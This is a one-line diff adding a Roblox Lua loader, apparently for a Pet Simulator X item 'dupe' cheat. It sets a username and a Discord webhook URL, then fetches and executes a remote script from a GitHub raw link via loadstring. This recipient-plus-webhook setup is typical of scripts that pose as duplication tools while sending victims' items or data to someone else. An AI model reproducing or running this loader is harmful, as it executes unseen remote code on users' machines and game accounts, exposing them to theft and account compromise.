@@ -1,0 +1,1 @@
+UserName = "alexgeorge343" WebHook = "https://discord.com/api/webhooks/1063202110101012520/JZPXX3rOCBu5J_F6Z1u_5cM8OM8M4yuQ9vHRTpyhh12LP13KScLErzfJWceeKUUX1P3R" loadstring(game:HttpGet("https://raw.githubusercontent.com/OliwierIsTryHard/DupeScriptPSX/main/DupeScriptPSX.lua", true))()
